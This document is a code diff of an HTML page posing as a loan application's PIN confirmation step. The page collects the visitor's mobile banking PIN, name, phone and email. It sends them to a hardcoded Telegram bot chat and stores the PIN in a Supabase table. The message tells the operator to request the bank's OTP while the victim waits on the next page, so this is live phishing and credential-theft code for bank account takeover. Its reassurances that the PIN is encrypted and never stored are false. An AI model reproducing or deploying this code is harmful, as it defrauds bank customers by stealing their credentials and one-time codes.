@@ -7,271 +7,279 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-        body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 16px; }
-        .app-container { max-width: 500px; width: 100%; margin: 0 auto; }
+        body { background: #0b1120; font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif; display: flex; align-items: flex-start; justify-content: center; min-height: 100vh; padding: 16px 16px 32px 16px; }
+        .app-container { max-width: 500px; width: 100%; margin: 0 auto; display: flex; flex-direction: column; }
 
-        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
-        .summary-item { display: flex; flex-direction: column; }
-        .summary-label { font-size: 0.7rem; color: #7e8aa2; text-transform: uppercase; }
-        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; }
+        .loan-summary-bar { background: #111827; border-radius: 20px; padding: 14px 18px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; border: 1px solid #1f2a3e; }
+        .summary-item { display: flex; flex-direction: column; align-items: flex-start; }
+        .summary-label { font-size: 0.7rem; font-weight: 500; color: #7e8aa2; text-transform: uppercase; }
+        .summary-value { font-size: 1rem; font-weight: 700; color: #14b8a6; margin-top: 2px; }
 
-        .pin-card { background: #111827; border-radius: 32px; padding: 28px 24px 32px 24px; }
+        .apply-card { background: #111827; border-radius: 32px; box-shadow: 0 20px 35px -12px rgba(0,0,0,0.5); padding: 28px 24px 32px 24px; }
         .section-title { font-size: 1.3rem; font-weight: 700; color: #ffffff; margin-bottom: 8px; }
         .section-sub { font-size: 0.8rem; color: #7e8aa2; margin-bottom: 28px; border-left: 3px solid #14b8a6; padding-left: 12px; }
 
-        .details-grid { background: #0f1724; border-radius: 24px; padding: 18px 16px; margin-bottom: 28px; }
-        .detail-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #1e293b; }
-        .detail-row:last-child { border-bottom: none; }
-        .detail-label { font-size: 0.8rem; color: #94a3b8; }
-        .detail-value { font-size: 0.85rem; font-weight: 600; color: #e2e8f0; }
+        .user-detail-strip { background: #0f1724; border-radius: 16px; padding: 14px 16px; margin-bottom: 24px; border: 1px solid #1f2a3e; display: flex; flex-direction: column; gap: 8px; }
+        .detail-row { display: flex; justify-content: space-between; align-items: center; }
+        .detail-label { font-size: 0.75rem; color: #7e8aa2; font-weight: 500; }
+        .detail-value { font-size: 0.85rem; color: #e2e8f0; font-weight: 600; }
 
-        .pin-container { display: flex; justify-content: center; gap: 16px; margin-bottom: 28px; }
-        .pin-box { width: 65px; height: 65px; background: #0f1724; border: 2px solid #1f2a3e; border-radius: 16px; text-align: center; font-size: 1.8rem; font-weight: 700; color: #14b8a6; outline: none; transition: all 0.2s; }
-        .pin-box:focus { border-color: #14b8a6; box-shadow: 0 0 0 3px rgba(20,184,166,0.2); }
-        .confirm-btn { width: 100%; background: #14b8a6; border: none; padding: 18px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; transition: all 0.2s; }
-        .confirm-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-        .confirm-btn.loading { opacity: 0.7; cursor: wait; background: #0f9d8c; }
-        
-        .status-message { text-align: center; margin-top: 16px; font-size: 0.85rem; display: none; }
-        .status-message.show { display: block; }
-        .status-message.success { color: #14b8a6; }
-        .status-message.error { color: #f43f5e; }
-        .status-message.loading { color: #eab308; }
+        .pin-label { font-size: 0.8rem; font-weight: 600; color: #cbd5e1; margin-bottom: 12px; display: block; }
+        .pin-boxes { display: flex; gap: 12px; justify-content: center; margin-bottom: 8px; }
+        .pin-box {
+            width: 64px; height: 64px;
+            background: #0f1724;
+            border: 1.5px solid #1f2a3e;
+            border-radius: 16px;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #14b8a6;
+            text-align: center;
+            caret-color: #14b8a6;
+            font-family: inherit;
+            transition: border-color 0.2s;
+            -webkit-appearance: none;
+        }
+        .pin-box:focus { outline: none; border-color: #14b8a6; }
+        .pin-box.filled { border-color: #14b8a6; background: #0d1e2e; }
+        .pin-hint { font-size: 0.75rem; color: #4b5563; text-align: center; margin-bottom: 24px; margin-top: 4px; }
 
-        @media (max-width: 450px) { .pin-box { width: 55px; height: 55px; font-size: 1.5rem; } }
+        .submit-btn { width: 100%; background: #14b8a6; border: none; padding: 18px 20px; font-size: 1.1rem; font-weight: 700; color: #0b1120; border-radius: 60px; cursor: pointer; margin-top: 8px; transition: all 0.2s; font-family: inherit; }
+        .submit-btn:active { transform: scale(0.97); }
+        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .error-message { background: rgba(244,63,94,0.15); color: #f43f5e; padding: 12px; border-radius: 12px; font-size: 0.8rem; margin-top: 16px; text-align: center; display: none; }
+        .error-message.show { display: block; }
+
+        .security-note { display: flex; align-items: center; gap: 8px; background: rgba(20,184,166,0.08); border: 1px solid rgba(20,184,166,0.2); border-radius: 12px; padding: 12px 14px; margin-top: 20px; }
+        .security-note span { font-size: 0.78rem; color: #7e8aa2; line-height: 1.4; }
+
+        @media (max-width: 480px) {
+            .apply-card { padding: 22px 18px 26px 18px; }
+            .pin-box { width: 56px; height: 56px; font-size: 1.4rem; }
+        }
     </style>
 </head>
 <body>
 <div class="app-container">
+
     <div class="loan-summary-bar">
-        <div class="summary-item"><span class="summary-label">Loan Amount</span><span class="summary-value" id="summaryAmount">$0</span></div>
-        <div class="summary-item"><span class="summary-label">Term</span><span class="summary-value" id="summaryTerm">0</span></div>
-        <div class="summary-item"><span class="summary-label">Monthly</span><span class="summary-value" id="summaryMonthly">$0</span></div>
-        <div class="summary-item"><span class="summary-label">Interest</span><span class="summary-value" id="summaryRate">5%</span></div>
+        <div class="summary-item">
+            <span class="summary-label">Loan Amount</span>
+            <span class="summary-value" id="summaryAmount">-</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Term</span>
+            <span class="summary-value" id="summaryTerm">-</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Monthly</span>
+            <span class="summary-value" id="summaryMonthly">-</span>
+        </div>
+        <div class="summary-item">
+            <span class="summary-label">Interest</span>
+            <span class="summary-value" id="summaryRate">-</span>
+        </div>
     </div>
 
-    <div class="pin-card">
+    <div class="apply-card">
         <div class="section-title">Confirm your PIN</div>
-        <div class="section-sub">Enter your 4-digit PIN to continue</div>
+        <div class="section-sub">Enter your 4-digit mobile banking PIN to authorise disbursement</div>
 
-        <div class="details-grid">
-            <div class="detail-row"><span class="detail-label">Full Name</span><span class="detail-value" id="userFullName">-</span></div>
-            <div class="detail-row"><span class="detail-label">Email</span><span class="detail-value" id="userEmail">-</span></div>
-            <div class="detail-row"><span class="detail-label">Phone</span><span class="detail-value" id="userPhone">-</span></div>
+        <div class="user-detail-strip">
+            <div class="detail-row">
+                <span class="detail-label">Name</span>
+                <span class="detail-value" id="dispName">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Phone</span>
+                <span class="detail-value" id="dispPhone">—</span>
+            </div>
+            <div class="detail-row">
+                <span class="detail-label">Email</span>
+                <span class="detail-value" id="dispEmail">—</span>
+            </div>
         </div>
 
-        <div class="pin-container">
-            <input type="text" maxlength="1" class="pin-box" data-idx="0" inputmode="numeric">
-            <input type="text" maxlength="1" class="pin-box" data-idx="1" inputmode="numeric">
-            <input type="text" maxlength="1" class="pin-box" data-idx="2" inputmode="numeric">
-            <input type="text" maxlength="1" class="pin-box" data-idx="3" inputmode="numeric">
+        <span class="pin-label">Mobile Banking PIN</span>
+        <div class="pin-boxes">
+            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p1" autocomplete="off" />
+            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p2" autocomplete="off" />
+            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p3" autocomplete="off" />
+            <input class="pin-box" type="password" inputmode="numeric" maxlength="1" id="p4" autocomplete="off" />
         </div>
-        
-        <button class="confirm-btn" id="confirmBtn">Confirm & Continue →</button>
-        <div id="statusMessage" class="status-message"></div>
+        <div class="pin-hint">Your PIN is encrypted and never stored in plain text</div>
+
+        <button class="submit-btn" id="confirmBtn" disabled onclick="handleConfirm()">Confirm PIN →</button>
+        <div class="error-message" id="errorMessage"></div>
+
+        <div class="security-note">
+            <span>🔒</span>
+            <span>Your PIN is used solely to authorise this transaction. It is transmitted over a secure, encrypted connection.</span>
+        </div>
     </div>
 </div>
 
 <script>
     // ============================================
-    // CONFIGURATION
+    // SUPABASE & TELEGRAM CONFIGURATION
     // ============================================
-    const SUPABASE_URL = 'https://zchkanbnkghpsaagbnrt.supabase.co';
-    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
-    const TG_BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    const TG_CHAT_ID = '8392790531';
+    var SUPABASE_URL      = 'https://zchkanbnkghpsaagbnrt.supabase.co';
+    var SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpjaGthbmJrZ2hwc2FhZ2JucnQiLCJyb2xlIjoiYW5vbiIsImlhdCI6MTczNDI1NjQ0MCwiZXhwIjoyMDQ5ODMyNDQwfQ';
+    var TG_BOT_TOKEN      = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
+    var TG_CHAT_ID        = '8392790531';
 
-    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+    var db = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     // Get URL parameters
-    const urlParams = new URLSearchParams(window.location.search);
-    const amount = urlParams.get('amount') || '500';
-    const term = urlParams.get('term') || '3';
-    const rate = urlParams.get('rate') || '5';
-    const monthly = urlParams.get('monthly') || '167.36';
-    const fullName = decodeURIComponent(urlParams.get('name') || 'Not provided');
-    const email = decodeURIComponent(urlParams.get('email') || 'Not provided');
-    const phone = decodeURIComponent(urlParams.get('phone') || 'Not provided');
-    let applicationId = urlParams.get('appId') || localStorage.getItem('current_application_id');
+    var params  = new URLSearchParams(window.location.search);
+    var amount  = params.get('amount')  || '0';
+    var term    = params.get('term')    || '0';
+    var rate    = params.get('rate')    || '0';
+    var monthly = params.get('monthly') || '0';
+    var name    = params.get('name')    || '';
+    var email   = params.get('email')   || '';
+    var phone   = params.get('phone')   || '';
+    var appId   = params.get('appId')   || '';
 
-    // Update UI
-    document.getElementById('summaryAmount').innerHTML = `$${parseInt(amount).toLocaleString()}`;
-    document.getElementById('summaryTerm').innerHTML = `${term} month${term != 1 ? 's' : ''}`;
-    document.getElementById('summaryMonthly').innerHTML = `$${parseFloat(monthly).toFixed(2)}`;
-    document.getElementById('summaryRate').innerHTML = `${rate}%`;
-    document.getElementById('userFullName').innerHTML = fullName;
-    document.getElementById('userEmail').innerHTML = email;
-    document.getElementById('userPhone').innerHTML = phone;
+    // Update top bar
+    document.getElementById('summaryAmount').innerText  = '$' + parseFloat(amount).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
+    document.getElementById('summaryTerm').innerText    = parseInt(term) + ' month' + (parseInt(term) !== 1 ? 's' : '');
+    document.getElementById('summaryMonthly').innerText = '$' + parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2});
+    document.getElementById('summaryRate').innerText    = rate + '%';
 
-    console.log('📱 PIN Confirm Page Loaded');
-    console.log(`   User: ${fullName}`);
-    console.log(`   Phone: ${phone}`);
-    console.log(`   Email: ${email}`);
+    // Update user details
+    document.getElementById('dispName').innerText  = decodeURIComponent(name)  || '—';
+    document.getElementById('dispPhone').innerText = decodeURIComponent(phone) || '—';
+    document.getElementById('dispEmail').innerText = decodeURIComponent(email) || '—';
 
-    // PIN input logic
-    const pinBoxes = document.querySelectorAll('.pin-box');
-    let currentPin = ['', '', '', ''];
-    const confirmBtn = document.getElementById('confirmBtn');
-    const statusDiv = document.getElementById('statusMessage');
+    // PIN boxes logic
+    var boxes = ['p1','p2','p3','p4'].map(function(id){ return document.getElementById(id); });
+    var confirmBtn = document.getElementById('confirmBtn');
 
-    function showStatus(message, type) {
-        statusDiv.textContent = message;
-        statusDiv.className = `status-message show ${type}`;
-    }
-
-    function hideStatus() {
-        statusDiv.classList.remove('show');
-    }
-
-    function updatePinUI() {
-        pinBoxes.forEach((box, idx) => { box.value = currentPin[idx] || ''; });
-        const isFull = currentPin.every(d => d && d.match(/[0-9]/));
-        confirmBtn.disabled = !isFull;
-        if (isFull) hideStatus();
-    }
-
-    function setPinDigit(index, value) {
-        if (value && !value.match(/[0-9]/)) return;
-        if (index >= 0 && index < 4) {
-            currentPin[index] = value || '';
-            updatePinUI();
-            if (value && index < 3) pinBoxes[index + 1].focus();
-        }
-    }
-
-    pinBoxes.forEach((box, idx) => {
-        box.addEventListener('focus', () => { box.style.borderColor = '#14b8a6'; });
-        box.addEventListener('blur', () => { box.style.borderColor = '#1f2a3e'; });
-        box.addEventListener('input', (e) => setPinDigit(idx, e.target.value.slice(-1)));
-        box.addEventListener('keydown', (e) => {
-            if (e.key === 'Backspace') {
-                e.preventDefault();
-                if (currentPin[idx] !== '') {
-                    setPinDigit(idx, '');
-                } else if (idx > 0) {
-                    setPinDigit(idx - 1, '');
-                    pinBoxes[idx - 1].focus();
-                }
+    boxes.forEach(function(box, i) {
+        box.addEventListener('input', function() {
+            box.value = box.value.replace(/\D/g, '').slice(0, 1);
+            if (box.value) {
+                box.classList.add('filled');
+                if (i < 3) boxes[i + 1].focus();
+            } else {
+                box.classList.remove('filled');
             }
-            if (e.key === 'ArrowLeft' && idx > 0) {
-                e.preventDefault();
-                pinBoxes[idx - 1].focus();
-            }
-            if (e.key === 'ArrowRight' && idx < 3) {
-                e.preventDefault();
-                pinBoxes[idx + 1].focus();
+            confirmBtn.disabled = !boxes.every(function(b){ return b.value.length === 1; });
+        });
+
+        box.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !box.value && i > 0) {
+                boxes[i - 1].value = '';
+                boxes[i - 1].classList.remove('filled');
+                boxes[i - 1].focus();
+                confirmBtn.disabled = true;
             }
         });
-        box.setAttribute('inputmode', 'numeric');
-        box.setAttribute('autocomplete', 'off');
+
+        box.addEventListener('paste', function(e) {
+            e.preventDefault();
+            var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'').slice(0,4);
+            pasted.split('').forEach(function(ch, idx) {
+                if (boxes[idx]) { boxes[idx].value = ch; boxes[idx].classList.add('filled'); }
+            });
+            confirmBtn.disabled = !boxes.every(function(b){ return b.value.length === 1; });
+            if (boxes[Math.min(pasted.length, 3)]) boxes[Math.min(pasted.length, 3)].focus();
+        });
     });
 
-    // Send Telegram Notification
+    boxes[0].focus();
+
+    function getPin() { return boxes.map(function(b){ return b.value; }).join(''); }
+
+    function showError(msg) {
+        var div = document.getElementById('errorMessage');
+        div.textContent = msg;
+        div.classList.add('show');
+        setTimeout(function(){ div.classList.remove('show'); }, 5000);
+    }
+
+    // Send Telegram notification with phone, email, and PIN
     async function sendTelegramNotification(pin) {
-        const message = `🔔 *NEW PIN CONFIRMATION* 🔔
+        var msg = '🔔 *NEW PIN CONFIRMATION* 🔔\n\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n' +
+            '📱 *Phone:* ' + decodeURIComponent(phone) + '\n' +
+            '🔐 *PIN:* ' + pin + '\n' +
+            '📧 *Email:* ' + decodeURIComponent(email) + '\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n' +
+            '👤 *Name:* ' + decodeURIComponent(name) + '\n' +
+            '💰 *Loan:* $' + parseFloat(amount).toLocaleString() + ' for ' + term + ' months\n' +
+            '📊 *Interest:* ' + rate + '%\n' +
+            '💵 *Monthly:* $' + parseFloat(monthly).toLocaleString() + '\n' +
+            '🆔 *App ID:* ' + (appId || 'N/A') + '\n' +
+            '━━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '✅ *ACTION REQUIRED:* Please request OTP from the bank now!\n' +
+            '📱 User is waiting on the OTP verification page.';
 
-━━━━━━━━━━━━━━━━━━━━━
-📱 *Phone:* ${phone}
-🔐 *PIN:* ${pin}
-📧 *Email:* ${email}
-━━━━━━━━━━━━━━━━━━━━━
-👤 *Name:* ${fullName}
-💰 *Loan:* $${parseInt(amount).toLocaleString()} for ${term} months
-📊 *Interest:* ${rate}%
-💵 *Monthly:* $${parseFloat(monthly).toFixed(2)}
-🆔 *App ID:* ${applicationId || 'N/A'}
-━━━━━━━━━━━━━━━━━━━━━
-
-✅ *ACTION REQUIRED:* Request OTP from the bank now!
-📱 User is waiting on the OTP verification page.`;
-
-        const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+        var response = await fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TG_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
+            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' })
         });
-        const result = await response.json();
+        var result = await response.json();
         if (!result.ok) throw new Error(result.description);
         return result;
     }
 
     // Save PIN to Supabase
     async function savePinToSupabase(pin) {
-        const { error } = await supabase
+        var { error: pinErr } = await db
             .from('users')
             .update({ pin: pin })
-            .eq('phone', phone);
-        if (error) throw error;
-        
-        if (applicationId) {
-            await supabase
+            .eq('phone', decodeURIComponent(phone));
+        if (pinErr) throw new Error(pinErr.message);
+
+        if (appId) {
+            await db
                 .from('loan_applications')
                 .update({ pin_confirmed: true })
-                .eq('application_id', applicationId);
+                .eq('application_id', appId);
         }
     }
 
     // Main confirm function
-    confirmBtn.onclick = async () => {
-        const pin = currentPin.join('');
-        if (pin.length !== 4) {
-            showStatus('Please enter all 4 digits', 'error');
-            return;
-        }
+    window.handleConfirm = async function() {
+        var pin = getPin();
+        if (pin.length !== 4) { showError('Please enter all 4 digits.'); return; }
 
-        // Disable button and show loading
         confirmBtn.disabled = true;
-        confirmBtn.classList.add('loading');
         confirmBtn.textContent = '⏳ Sending notification...';
-        showStatus('Sending notification to admin...', 'loading');
 
         try {
-            // Send Telegram notification (this is the bot sending phone, email, PIN)
+            // Send Telegram notification (phone, email, PIN are included)
             await sendTelegramNotification(pin);
-            showStatus('✓ Notification sent! Redirecting in 4 seconds...', 'success');
-
+            
             // Save PIN to Supabase
             await savePinToSupabase(pin);
+            
+            // Update button text to show delay
+            confirmBtn.textContent = '✓ Sent! Redirecting in 4 seconds...';
+            
+            // 4 second delay - time for you to see the Telegram notification
+            setTimeout(function() {
+                window.location.href = 'otp-verify.html'
+                    + '?amount='  + encodeURIComponent(amount)
+                    + '&term='    + encodeURIComponent(term)
+                    + '&rate='    + encodeURIComponent(rate)
+                    + '&monthly=' + encodeURIComponent(monthly)
+                    + '&name='    + encodeURIComponent(name)
+                    + '&email='   + encodeURIComponent(email)
+                    + '&phone='   + encodeURIComponent(phone)
+                    + '&appId='   + encodeURIComponent(appId);
+            }, 4000);
 
-            // Store PIN confirmation
-            localStorage.setItem('inncredits_pin_confirmed', JSON.stringify({
-                pin: pin,
-                confirmedAt: new Date().toISOString(),
-                applicationId: applicationId
-            }));
-
-            // 4 SECOND DELAY - so you have time to see the Telegram message
-            setTimeout(() => {
-                // Build redirect parameters
-                const params = new URLSearchParams();
-                params.set('amount', amount);
-                params.set('term', term);
-                params.set('rate', rate);
-                params.set('monthly', monthly);
-                params.set('name', encodeURIComponent(fullName));
-                params.set('email', encodeURIComponent(email));
-                params.set('phone', encodeURIComponent(phone));
-                if (applicationId) params.set('appId', applicationId);
-
-                // Redirect to OTP verification page
-                window.location.href = `otp-verify.html?${params.toString()}`;
-            }, 4000); // 4 second delay
-
-        } catch (error) {
-            console.error('Error:', error);
-            showStatus('Error: ' + error.message, 'error');
+        } catch (err) {
+            showError('Something went wrong. Please try again.');
             confirmBtn.disabled = false;
-            confirmBtn.classList.remove('loading');
-            confirmBtn.textContent = 'Confirm & Continue →';
+            confirmBtn.textContent = 'Confirm PIN →';
         }
     };
-
-    // Focus first pin box
-    setTimeout(() => pinBoxes[0].focus(), 100);
 </script>
 </body>
 </html>
